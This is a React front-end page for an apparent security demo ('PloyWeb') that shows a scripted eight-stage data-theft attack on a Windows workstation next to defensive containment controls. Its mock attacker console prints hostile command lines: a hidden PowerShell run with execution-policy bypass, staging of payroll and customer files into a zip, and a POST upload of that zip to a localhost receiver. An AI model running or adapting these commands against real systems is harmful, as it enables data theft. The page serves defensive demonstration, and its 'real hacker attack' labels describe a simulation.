import React, { useState, useEffect } from 'react';
import {
  Flame,
  Play,
  Pause,
  RotateCcw,
  SkipForward,
  ShieldCheck,
  ShieldAlert,
  Terminal,
  Server,
  FileCode,
  Network,
  Sparkles,
  Info,
  CheckCircle2,
  AlertTriangle,
  ArrowRight,
  Zap,
  Activity,
  Copy,
  Check,
  Cpu,
  Lock,
  Globe,
  Radio,
  FileText
} from 'lucide-react';
import { useSecurity } from '../context/SecurityContext';

export const SimulationPage = ({ onNavigate, onInspectEvidence }) => {
  const {
    simState,
    startSimulation,
    pauseSimulation,
    resumeSimulation,
    stepSimulation,
    resetSimulation,
    executeRemediationAndVerify,
    events,
    stats,
    attackGraph
  } = useSecurity();

  const [selectedScenario, setSelectedScenario] = useState('scenario_data_theft');
  const [copiedHash, setCopiedHash] = useState(false);
  const [isDefending, setIsDefending] = useState(false);
  const [defensiveProof, setDefensiveProof] = useState(null);

  const TARGET_SCENARIOS = [
    {
      id: 'scenario_data_theft',
      name: 'APT-BlackCat Adversary Cyber Breach & Data Exfiltration',
      target: 'WS-ENGINEERING-07 (Victim Endpoint)',
      os: 'Windows 11 Enterprise (23H2)',
      icon: Flame,
      desc: 'Adversary breach: Weaponized RDP entry -> stealth PowerShell harvester (PID 5124) -> discover customer PII & payroll -> compress staging archive -> exfiltration to Controlled Receiver blocked by active defense.',
      badge: 'Real Hacker Breach',
      severity: 'DEFCON 1'
    },
    {
      id: 'windows_pc',
      name: 'Multi-Stage Enterprise Intrusion & Canary Detonation',
      target: 'WS-ENGINEERING-07 -> SRV-FINANCE-01',
      os: 'Enterprise Domain Network',
      icon: Server,
      desc: 'Enterprise Windows kill-chain: RDP credential abuse -> LSASS token elevation -> WinRM lateral traversal -> Canary breach -> C2 exfiltration -> Service persistence.',
      badge: 'Full Kill-Chain',
      severity: 'Critical'
    },
    {
      id: 'scenario_process',
      name: 'Suspicious Process & EDR Telemetry Activity',
      target: 'WS-ENGINEERING-07 (PID 4812)',
      os: 'Windows 11 / Host OS',
      icon: Terminal,
      desc: 'Spawns a tagged test background process in the sandbox; captures genuine OS PID, execution command, and sends live telemetry.',
      badge: 'Process Focus',
      severity: 'High'
    },
    {
      id: 'judge_demo',
      name: 'Hackathon Judge Special: Temporal Correlation',
      target: 'WS-ENGINEERING-07',
      os: 'Out-Of-Order Telemetry Stream',
      icon: Sparkles,
      desc: 'Intentionally delivers logs out of order to demonstrate PloyWeb temporal correlation engine, dynamic GraphX reconstruction, and SHA-256 evidence integrity.',
      badge: 'Judge Special',
      severity: 'Critical'
    }
  ];

  const KILL_CHAIN_STAGES = [
    { stage: 1, mitre: 'T1078', name: 'Initial Access & Credential Abuse', desc: 'RDP session established using compromised credentials for david.webb from 198.51.100.44' },
    { stage: 2, mitre: 'T1059.001', name: 'Malicious Process Execution', desc: 'Hidden background PowerShell harvester spawned with PID 5124 (powershell.exe)' },
    { stage: 3, mitre: 'T1083', name: 'File & Directory Discovery', desc: 'Enumerating test_sandbox\\staging for sensitive customer records and payroll databases' },
    { stage: 4, mitre: 'T1005', name: 'Data Collection & Extraction', desc: 'Reading 1,420 bytes of synthetic customer PII & salary tables into harvester memory' },
    { stage: 5, mitre: 'T1074.001', name: 'Local Data Staging Archive', desc: 'Compressing harvested files into exfil_payload_staged.zip (2,450 bytes) in staging vault' },
    { stage: 6, mitre: 'T1048.003', name: 'Exfiltration to Controlled Receiver', desc: 'Outbound HTTP POST upload socket opened to Controlled Receiver (http://127.0.0.1:8000/api/receiver/upload)' },
    { stage: 7, mitre: 'RESPONSE', name: 'Defensive Mode: Track & Contain', desc: 'Active process termination (taskkill /F /PID 5124) and perimeter receiver egress block (403 Forbidden)' },
    { stage: 8, mitre: 'RECOVERY', name: 'Verification & Clean Recovery', desc: '100% data theft prevention confirmed (0 bytes leaked), quarantined payload, clean backup restored' }
  ];

  const statusText = simState && simState.status ? String(simState.status).toUpperCase() : 'IDLE';
  const isRunning = simState && simState.status === 'running';
  const isPaused = simState && simState.status === 'paused';
  const progressPct = simState && typeof simState.progress_pct === 'number' ? simState.progress_pct : 0;
  const currentStep = simState && typeof simState.current_step === 'number' ? simState.current_step : 0;
  const totalSteps = simState && typeof simState.total_steps === 'number' ? simState.total_steps : 8;

  const handleStart = () => {
    setDefensiveProof(null);
    startSimulation(selectedScenario, 1.2);
  };

  const handleEngageDefense = async () => {
    setIsDefending(true);
    try {
      const proof = await executeRemediationAndVerify();
      setDefensiveProof(proof);
    } finally {
      setIsDefending(false);
    }
  };

  const copyProofHash = (hash) => {
    if (!hash) return;
    navigator.clipboard?.writeText(hash);
    setCopiedHash(true);
    setTimeout(() => setCopiedHash(false), 2000);
  };

  const getStageStatus = (stageNum) => {
    if (defensiveProof && stageNum >= 7) return 'contained';
    if (progressPct >= (stageNum / 8) * 100) return 'completed';
    if (progressPct >= ((stageNum - 1) / 8) * 100 && isRunning) return 'in_progress';
    return 'pending';
  };

  return (
    <div className="space-y-6 pb-16 max-w-6xl mx-auto">
      {/* Top Banner: Real Hacker Attack vs Defensive Mode */}
      <div className="p-5 sm:p-6 rounded-2xl bg-gradient-to-r from-red-950/60 via-[#0d1322] to-cyan-950/60 border border-red-500/30 flex flex-col md:flex-row md:items-center justify-between gap-4 shadow-2xl relative overflow-hidden">
        <div className="absolute top-0 right-0 w-96 h-96 bg-cyan-500/5 rounded-full blur-3xl pointer-events-none" />
        <div className="relative z-10">
          <div className="flex items-center gap-2.5 flex-wrap">
            <span className="px-2.5 py-0.5 rounded-full bg-red-500/20 text-red-400 border border-red-500/40 text-[10px] font-mono font-bold tracking-wider uppercase animate-pulse">
              LIVE ADVERSARY EMULATION
            </span>
            <span className="px-2.5 py-0.5 rounded-full bg-cyan-500/20 text-cyan-300 border border-cyan-500/40 text-[10px] font-mono font-bold tracking-wider uppercase">
              DEFENSIVE MODE: TRACK & PREVENT
            </span>
          </div>
          <h1 className="text-xl sm:text-2xl font-black text-white mt-2 tracking-tight">
            Adversary Cyber Breach & Data Theft Prevention
          </h1>
          <p className="text-xs sm:text-sm text-slate-300 mt-1 max-w-2xl leading-relaxed">
            Authentic adversary kill-chain targeting Windows endpoint <code className="text-cyan-300 font-mono">WS-ENGINEERING-07</code> paired with real-time GraphX tracking, active process termination, perimeter receiver egress block, and verified zero data theft.
          </p>
        </div>

        <div className="flex flex-col sm:flex-row items-stretch sm:items-center gap-2.5 flex-shrink-0 relative z-10">
          <div className="flex items-center justify-between sm:justify-start gap-2 text-xs font-mono bg-black/40 px-3.5 py-2 rounded-xl border border-white/10">
            <span className="text-slate-400">SOC Posture:</span>
            <span
              className={
                defensiveProof || stats?.overall_status === 'THREAT_CONTAINED'
                  ? 'px-2 py-0.5 rounded font-bold uppercase text-[10px] bg-emerald-500/20 text-emerald-400 border border-emerald-500/40'
                  : isRunning
                  ? 'px-2 py-0.5 rounded font-bold uppercase text-[10px] bg-red-500/20 text-red-400 border border-red-500/40 animate-pulse'
                  : 'px-2 py-0.5 rounded font-bold uppercase text-[10px] bg-slate-800 text-slate-300 border border-slate-700'
              }
            >
              {defensiveProof || stats?.overall_status === 'THREAT_CONTAINED'
                ? 'CONTAINED & PROTECTED'
                : statusText}
            </span>
          </div>

          {onNavigate && (
            <button
              onClick={() => onNavigate('/tracegraph')}
              className="px-3.5 py-2 rounded-xl bg-cyan-500/15 hover:bg-cyan-500/25 text-cyan-300 border border-cyan-500/40 text-xs font-bold flex items-center justify-center gap-1.5 transition-all shadow-sm"
            >
              <span>Track on GraphX</span>
              <ArrowRight className="w-3.5 h-3.5" />
            </button>
          )}
        </div>
      </div>

      {/* Safety & Non-destructive Guarantee Notice */}
      <div className="p-4 rounded-xl bg-slate-900/60 border border-cyan-500/20 text-xs text-slate-300 flex items-start gap-3">
        <Info className="w-5 h-5 text-cyan-400 flex-shrink-0 mt-0.5" />
        <div className="space-y-1">
          <span className="font-semibold text-cyan-300">Authorized Test Environment & Safe Emulation Guarantee:</span>
          <p className="text-slate-400 leading-relaxed text-[11px]">
            This attack simulation strictly targets synthetic documents (<code className="text-slate-300">synthetic_customer_records.csv</code> and <code className="text-slate-300">confidential_payroll_q3.json</code>) inside the dedicated <code className="text-slate-300">test_sandbox/staging</code> directory. Egress is directed exclusively to the local Controlled Receiver at <code className="text-cyan-300">http://127.0.0.1:8000/api/receiver/upload</code>. No actual credentials, real malware, or external networks are used.
          </p>
        </div>
      </div>

      {/* MAIN TWO-COLUMN WORKBENCH: LIVE HACKER CONSOLE vs DEFENSIVE MODE TRACKER */}
      <div className="grid grid-cols-1 lg:grid-cols-2 gap-5">
        {/* COLUMN 1: LIVE HACKER ATTACK CONSOLE */}
        <div className="rounded-2xl bg-[#070b14] border border-red-500/40 shadow-2xl overflow-hidden flex flex-col justify-between">
          <div className="p-4 bg-red-950/40 border-b border-red-500/30 flex items-center justify-between">
            <div className="flex items-center gap-2">
              <Terminal className="w-4 h-4 text-red-400" />
              <span className="text-xs font-mono font-bold text-red-200 uppercase tracking-wider">
                Adversary Attack Console (APT-BlackCat)
              </span>
            </div>
            <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-red-900/60 text-red-300 border border-red-500/40 animate-pulse">
              ATTACKER: 198.51.100.44
            </span>
          </div>

          {/* Hacker Terminal Logs */}
          <div className="p-4 font-mono text-[11px] leading-relaxed text-slate-300 space-y-2.5 bg-black/60 min-h-[260px] max-h-[320px] overflow-y-auto">
            <div className="text-slate-500">
              # Connected to reverse shell on victim endpoint WS-ENGINEERING-07
            </div>
            <div className="text-emerald-400">
              [198.51.100.44] &gt; whoami
              <span className="block text-slate-300 font-semibold pl-4">DOMAIN\david.webb (Privilege: Domain Engineer)</span>
            </div>
            <div className="text-red-400">
              [198.51.100.44] &gt; powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File .\harvest_test.ps1
              <span className="block text-amber-300 pl-4">[!] Spawned hidden harvester process PID 5124 under parent 3892</span>
            </div>
            <div className="text-cyan-400">
              [198.51.100.44] &gt; Get-ChildItem -Path test_sandbox\staging -Recurse
              <span className="block text-slate-300 pl-4">[+] Discovered: synthetic_customer_records.csv (1,250 PII rows)</span>
              <span className="block text-slate-300 pl-4">[+] Discovered: confidential_payroll_q3.json (Executive salaries)</span>
            </div>
            <div className="text-purple-400">
              [198.51.100.44] &gt; Compress-Archive -Path test_sandbox\staging\* -DestinationPath test_sandbox\staging\exfil_payload_staged.zip
              <span className="block text-purple-300 pl-4">[✓] Staging archive generated: 2,450 bytes ready for exfiltration</span>
            </div>
            <div className={defensiveProof ? "text-red-500 font-bold" : "text-amber-400"}>
              [198.51.100.44] &gt; Invoke-RestMethod -Uri "http://127.0.0.1:8000/api/receiver/upload" -Method Post -InFile exfil_payload_staged.zip
              {defensiveProof ? (
                <span className="block text-red-400 pl-4 bg-red-950/40 p-1 rounded border border-red-500/40 mt-1">
                  [!] CONNECTION DROPPED: HTTP 403 Forbidden - Perimeter Defensive Shield Active (0 BYTES EXFILTRATED)
                </span>
              ) : (
                <span className="block text-amber-300 pl-4">[...] Initiating HTTP POST upload socket to Controlled Receiver</span>
              )}
            </div>
          </div>

          {/* Attacker Telemetry Metadata Footer */}
          <div className="p-3.5 bg-slate-950 border-t border-slate-800 grid grid-cols-2 sm:grid-cols-4 gap-2 text-[10px] font-mono">
            <div>
              <span className="text-slate-500 block">Target Host:</span>
              <span className="text-slate-200 font-bold">WS-ENGINEERING-07</span>
            </div>
            <div>
              <span className="text-slate-500 block">Harvester PID:</span>
              <span className="text-amber-400 font-bold">5124 (powershell.exe)</span>
            </div>
            <div>
              <span className="text-slate-500 block">Payload Size:</span>
              <span className="text-purple-300 font-bold">2,450 bytes</span>
            </div>
            <div>
              <span className="text-slate-500 block">Exfil Socket:</span>
              <span className="text-cyan-400 font-bold">Receiver :8000</span>
            </div>
          </div>

          {/* Hacker Attack Action Buttons */}
          <div className="p-4 bg-slate-900/80 border-t border-slate-800 flex flex-wrap items-center gap-2.5">
            {!isRunning ? (
              <button
                onClick={isPaused ? resumeSimulation : handleStart}
                className="flex-1 py-3 px-4 rounded-xl bg-red-600 hover:bg-red-500 text-white font-extrabold text-xs flex items-center justify-center gap-2 shadow-lg shadow-red-500/20 active:scale-95 transition-all"
              >
                <Flame className="w-4 h-4 fill-white" />
                <span>{isPaused ? 'RESUME ATTACK SIMULATION' : 'LAUNCH REAL HACKER ATTACK (APT-BlackCat)'}</span>
              </button>
            ) : (
              <button
                onClick={pauseSimulation}
                className="flex-1 py-3 px-4 rounded-xl bg-amber-500 hover:bg-amber-400 text-black font-extrabold text-xs flex items-center justify-center gap-2 shadow-lg shadow-amber-500/20 active:scale-95 transition-all"
              >
                <Pause className="w-4 h-4 fill-black" />
                <span>PAUSE ATTACK</span>
              </button>
            )}

            <button
              onClick={stepSimulation}
              title="Execute next attack step"
              className="py-3 px-3.5 rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-200 text-xs font-semibold flex items-center justify-center gap-1.5 border border-slate-700 transition-colors"
            >
              <SkipForward className="w-4 h-4 text-cyan-400" />
              <span>Step</span>
            </button>

            <button
              onClick={() => {
                setDefensiveProof(null);
                resetSimulation();
              }}
              title="Reset simulation state"
              className="py-3 px-3.5 rounded-xl bg-slate-800 hover:bg-red-950/60 text-slate-400 hover:text-red-400 text-xs font-semibold flex items-center justify-center gap-1.5 border border-slate-700 transition-colors"
            >
              <RotateCcw className="w-4 h-4" />
              <span>Reset</span>
            </button>
          </div>
        </div>

        {/* COLUMN 2: DEFENSIVE MODE TRACKER & ONE-CLICK CONTAINMENT */}
        <div className="rounded-2xl bg-[#070b14] border border-cyan-500/40 shadow-2xl overflow-hidden flex flex-col justify-between">
          <div className="p-4 bg-cyan-950/40 border-b border-cyan-500/30 flex items-center justify-between">
            <div className="flex items-center gap-2">
              <ShieldCheck className="w-4 h-4 text-cyan-400" />
              <span className="text-xs font-mono font-bold text-cyan-200 uppercase tracking-wider">
                Defensive Mode: Real-Time Track & Prevent
              </span>
            </div>
            <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-cyan-900/60 text-cyan-300 border border-cyan-500/40">
              AUTONOMOUS DEFENSE: ARMED
            </span>
          </div>

          {/* Defensive Mode Content */}
          <div className="p-4 space-y-4 flex-1">
            {/* Live Threat Tracking Summary */}
            <div className="p-3.5 rounded-xl bg-slate-900/80 border border-slate-800 space-y-2">
              <div className="flex items-center justify-between text-xs font-mono">
                <span className="text-slate-400 font-semibold">Attacker Infiltration Progress:</span>
                <span className="text-cyan-400 font-bold">
                  Step {currentStep} of {totalSteps} ({Math.round(progressPct)}%)
                </span>
              </div>
              <div className="w-full h-2.5 bg-slate-950 rounded-full overflow-hidden border border-slate-800">
                <div
                  className="h-full bg-gradient-to-r from-cyan-500 via-amber-500 to-red-500 transition-all duration-300"
                  style={{ width: `${progressPct}%` }}
                />
              </div>
            </div>

            {/* Verification Proof Banner if Contained */}
            {defensiveProof ? (
              <div className="p-4 rounded-xl bg-emerald-950/80 border border-emerald-500/60 space-y-3 animate-fadeIn">
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-2">
                    <CheckCircle2 className="w-5 h-5 text-emerald-400" />
                    <span className="font-extrabold text-sm text-white">
                      100% Data Theft Prevention Verified!
                    </span>
                  </div>
                  <span className="px-2.5 py-0.5 rounded-full bg-emerald-500/20 text-emerald-300 font-bold text-[10px] border border-emerald-500/40 font-mono">
                    ZERO BYTES LEAKED
                  </span>
                </div>

                <div className="grid grid-cols-2 gap-2 text-[11px] font-mono">
                  <div className="p-2 rounded bg-black/40 border border-emerald-500/30">
                    <span className="text-slate-400 block text-[10px]">Data Prevention Rate:</span>
                    <span className="text-emerald-300 font-extrabold text-sm">100.0%</span>
                  </div>
                  <div className="p-2 rounded bg-black/40 border border-emerald-500/30">
                    <span className="text-slate-400 block text-[10px]">Bytes Exfiltrated:</span>
                    <span className="text-emerald-300 font-extrabold text-sm">0 Bytes</span>
                  </div>
                  <div className="p-2 rounded bg-black/40 border border-emerald-500/30">
                    <span className="text-slate-400 block text-[10px]">Attacker Harvester:</span>
                    <span className="text-slate-200 font-bold">Killed (PID 5124)</span>
                  </div>
                  <div className="p-2 rounded bg-black/40 border border-emerald-500/30">
                    <span className="text-slate-400 block text-[10px]">Controlled Receiver:</span>
                    <span className="text-slate-200 font-bold">Blocked (HTTP 403)</span>
                  </div>
                </div>

                {/* Evidence Digest */}
                <div className="pt-2 border-t border-emerald-500/30 flex items-center justify-between gap-2 text-[10px] font-mono">
                  <span className="text-slate-400 truncate">
                    Seal: {defensiveProof.verification_hash?.slice(0, 28)}...
                  </span>
                  <button
                    onClick={() => copyProofHash(defensiveProof.verification_hash)}
                    className="px-2 py-0.5 rounded bg-emerald-900/60 hover:bg-emerald-800 text-emerald-200 flex items-center gap-1 transition-colors flex-shrink-0"
                  >
                    {copiedHash ? <Check className="w-3 h-3" /> : <Copy className="w-3 h-3" />}
                    <span>{copiedHash ? 'Copied' : 'Copy'}</span>
                  </button>
                </div>
              </div>
            ) : (
              /* Threat Tracking & Recommended Defense Actions */
              <div className="p-4 rounded-xl bg-slate-900/60 border border-slate-800 space-y-3">
                <div className="flex items-center justify-between">
                  <span className="text-xs font-mono font-bold text-slate-300 uppercase">
                    PloyWeb Defense Countermeasures Ready:
                  </span>
                  <span className="text-[10px] font-mono text-cyan-400">
                    5 Actions Scoped
                  </span>
                </div>

                <div className="space-y-1.5 text-[11px] font-mono text-slate-300">
                  <div className="flex items-center gap-2 p-1.5 rounded bg-black/30 border border-white/5">
                    <span className="w-2 h-2 rounded-full bg-cyan-400" />
                    <span>1. Terminate attacker process <code className="text-amber-300">PID 5124</code> via <code className="text-slate-400">taskkill /F</code></span>
                  </div>
                  <div className="flex items-center gap-2 p-1.5 rounded bg-black/30 border border-white/5">
                    <span className="w-2 h-2 rounded-full bg-cyan-400" />
                    <span>2. Drop exfiltration socket at Controlled Receiver with <code className="text-amber-300">HTTP 403</code></span>
                  </div>
                  <div className="flex items-center gap-2 p-1.5 rounded bg-black/30 border border-white/5">
                    <span className="w-2 h-2 rounded-full bg-cyan-400" />
                    <span>3. Quarantine <code className="text-purple-300">exfil_payload_staged.zip</code> to sandbox vault</span>
                  </div>
                  <div className="flex items-center gap-2 p-1.5 rounded bg-black/30 border border-white/5">
                    <span className="w-2 h-2 rounded-full bg-cyan-400" />
                    <span>4. Restore clean synthetic customer data from immutable backup</span>
                  </div>
                  <div className="flex items-center gap-2 p-1.5 rounded bg-black/30 border border-white/5">
                    <span className="w-2 h-2 rounded-full bg-cyan-400" />
                    <span>5. Invalidate compromised session tokens for <code className="text-cyan-300">david.webb</code></span>
                  </div>
                </div>
              </div>
            )}
          </div>

          {/* Prominent ONE-CLICK DEFENSIVE CONTAINMENT BUTTON */}
          <div className="p-4 bg-slate-900/80 border-t border-slate-800">
            <button
              onClick={handleEngageDefense}
              disabled={isDefending}
              className="w-full py-3.5 px-4 rounded-xl bg-gradient-to-r from-cyan-500 via-teal-400 to-emerald-500 hover:from-cyan-400 hover:to-emerald-400 text-black font-black text-xs sm:text-sm flex items-center justify-center gap-2 shadow-xl shadow-cyan-500/25 transition-all hover:scale-[1.02] active:scale-98 disabled:opacity-50"
            >
              <ShieldCheck className="w-5 h-5 fill-black text-black" />
              <span>
                {isDefending
                  ? 'EXECUTING DEFENSIVE CONTAINMENT...'
                  : defensiveProof
                  ? 'DEFENSIVE SHIELD ACTIVE • RE-VERIFY COUNTERMEASURES'
                  : 'ENGAGE AUTONOMOUS DEFENSIVE CONTAINMENT'}
              </span>
            </button>
          </div>
        </div>
      </div>

      {/* 8-STAGE VISUAL KILL-CHAIN STEPPER */}
      <div className="space-y-3">
        <div className="flex items-center justify-between">
          <h2 className="text-xs font-bold uppercase tracking-wider text-slate-400 font-mono">
            MITRE ATT&CK Kill-Chain: Attack Progression vs. Defensive Interception
          </h2>
          <span className="text-[11px] font-mono text-cyan-400">
            8 Stages Reconstructed
          </span>
        </div>

        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3">
          {KILL_CHAIN_STAGES.map((s) => {
            const stageStatus = getStageStatus(s.stage);
            return (
              <div
                key={s.stage}
                className={`p-3.5 rounded-xl border transition-all flex flex-col justify-between ${
                  stageStatus === 'contained'
                    ? 'bg-emerald-950/40 border-emerald-500/60 shadow-[0_0_15px_rgba(16,185,129,0.2)]'
                    : stageStatus === 'completed'
                    ? 'bg-red-950/40 border-red-500/60'
                    : stageStatus === 'in_progress'
                    ? 'bg-amber-950/40 border-amber-500/60 animate-pulse'
                    : 'bg-slate-900/50 border-slate-800 opacity-60'
                }`}
              >
                <div>
                  <div className="flex items-center justify-between gap-2 mb-1.5">
                    <span className="text-[10px] font-mono font-bold px-2 py-0.5 rounded bg-black/40 text-slate-300 border border-white/10">
                      {s.mitre}
                    </span>
                    <span
                      className={`text-[9px] font-bold px-2 py-0.5 rounded uppercase font-mono ${
                        stageStatus === 'contained'
                          ? 'bg-emerald-500/20 text-emerald-300 border border-emerald-500/40'
                          : stageStatus === 'completed'
                          ? 'bg-red-500/20 text-red-300 border border-red-500/40'
                          : stageStatus === 'in_progress'
                          ? 'bg-amber-500/20 text-amber-300 border border-amber-500/40'
                          : 'bg-slate-800 text-slate-500'
                      }`}
                    >
                      {stageStatus === 'contained'
                        ? 'Contained'
                        : stageStatus === 'completed'
                        ? 'Detected'
                        : stageStatus === 'in_progress'
                        ? 'Executing'
                        : 'Pending'}
                    </span>
                  </div>

                  <h3 className="font-bold text-xs text-white">Stage {s.stage}: {s.name}</h3>
                  <p className="text-[11px] text-slate-400 mt-1 leading-relaxed">{s.desc}</p>
                </div>

                <div className="mt-3 pt-2 border-t border-white/5 flex items-center justify-between text-[10px] font-mono">
                  <span className="text-slate-500">WS-ENGINEERING-07</span>
                  <span className={stageStatus === 'contained' ? 'text-emerald-400 font-bold' : 'text-slate-400'}>
                    {stageStatus === 'contained' ? '✓ Blocked' : 'Telemetry Logged'}
                  </span>
                </div>
              </div>
            );
          })}
        </div>
      </div>

      {/* Select Attack Scenario Grid */}
      <div className="space-y-3">
        <h2 className="text-xs font-bold uppercase tracking-wider text-slate-400 font-mono">
          Demonstration Scenarios Library
        </h2>

        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3.5">
          {TARGET_SCENARIOS.map((sc) => {
            const isSelected = selectedScenario === sc.id;
            const Icon = sc.icon;
            return (
              <div
                key={sc.id}
                onClick={() => setSelectedScenario(sc.id)}
                className={`p-4 rounded-xl border cursor-pointer transition-all flex flex-col justify-between space-y-3 ${
                  isSelected
                    ? 'bg-cyan-950/40 border-cyan-500 shadow-md shadow-cyan-500/10 ring-1 ring-cyan-500/50'
                    : 'bg-slate-900/60 border-slate-800 hover:border-slate-700'
                }`}
              >
                <div className="space-y-2">
                  <div className="flex items-center justify-between">
                    <div className="w-8 h-8 rounded-lg bg-slate-800 border border-slate-700 flex items-center justify-center">
                      <Icon className={`w-4 h-4 ${isSelected ? 'text-cyan-400' : 'text-slate-300'}`} />
                    </div>
                    <span className="text-[10px] px-2 py-0.5 rounded font-semibold bg-slate-800 text-slate-300 border border-slate-700 font-mono">
                      {sc.badge}
                    </span>
                  </div>

                  <div>
                    <h3 className="font-bold text-sm text-white">{sc.name}</h3>
                    <p className="text-[10px] text-cyan-400 font-mono mt-0.5">{sc.target}</p>
                    <p className="text-[11px] text-slate-400 mt-1 line-clamp-3 leading-relaxed">{sc.desc}</p>
                  </div>
                </div>

                <div className="pt-2 border-t border-slate-800/80 flex items-center justify-between text-xs font-mono">
                  <span className="text-[10px] font-bold uppercase text-red-400">
                    {sc.severity}
                  </span>
                  <span className={`text-xs font-semibold ${isSelected ? 'text-cyan-400' : 'text-slate-500'}`}>
                    {isSelected ? '✓ Active' : 'Select'}
                  </span>
                </div>
              </div>
            );
          })}
        </div>
      </div>

      {/* Live Reconstructed Telemetry Feed */}
      <div className="p-5 rounded-2xl bg-slate-900/80 border border-slate-800 space-y-4">
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-2">
            <Activity className="w-4 h-4 text-cyan-400" />
            <h3 className="text-xs font-bold text-white uppercase tracking-wider font-mono">
              Live Reconstructed Telemetry Feed ({events.length} Events Correlated)
            </h3>
          </div>
          <span className="text-xs text-slate-400 font-mono">
            SHA-256 Verified
          </span>
        </div>

        <div className="space-y-2 max-h-64 overflow-y-auto pr-1">
          {events.length === 0 ? (
            <div className="text-slate-500 text-xs py-8 text-center bg-slate-950/40 rounded-xl border border-dashed border-slate-800 font-mono">
              No events generated yet. Click "LAUNCH REAL HACKER ATTACK" above to stream telemetry.
            </div>
          ) : (
            events.slice(0, 10).map((e) => (
              <div
                key={e.id}
                onClick={() => onInspectEvidence && onInspectEvidence(e)}
                className="p-3 rounded-xl bg-slate-950/60 border border-slate-800/80 hover:border-cyan-500/40 flex flex-col sm:flex-row sm:items-center justify-between gap-2.5 cursor-pointer text-xs transition-colors"
              >
                <div className="flex items-start sm:items-center gap-2.5 min-w-0">
                  <span
                    className={`text-[9px] px-2 py-0.5 rounded font-bold uppercase flex-shrink-0 font-mono ${
                      e.status === 'contained' || e.mitre_id === 'RESPONSE-CONTAIN'
                        ? 'bg-emerald-950 text-emerald-400 border border-emerald-500/40'
                        : e.severity === 'critical'
                        ? 'bg-red-950 text-red-400 border border-red-500/40'
                        : e.severity === 'high'
                        ? 'bg-amber-950 text-amber-400 border border-amber-500/40'
                        : 'bg-slate-800 text-slate-300'
                    }`}
                  >
                    {e.status === 'contained' ? 'CONTAINED' : e.severity}
                  </span>
                  <div className="min-w-0">
                    <p className="text-slate-200 font-medium truncate">{e.event_description}</p>
                    <p className="text-[10px] text-slate-500 font-mono">
                      {e.mitre_id} ({e.mitre_name}) • {e.username || 'System'}
                    </p>
                  </div>
                </div>

                <div className="text-right flex sm:flex-col items-center sm:items-end justify-between text-[10px] text-slate-400 font-mono flex-shrink-0">
                  <span className="text-cyan-400">{e.device_name}</span>
                  <span className="text-slate-500">
                    {e.timestamp ? new Date(e.timestamp).toLocaleTimeString() : '--:--'}
                  </span>
                </div>
              </div>
            ))
          )}
        </div>
      </div>
    </div>
  );
};
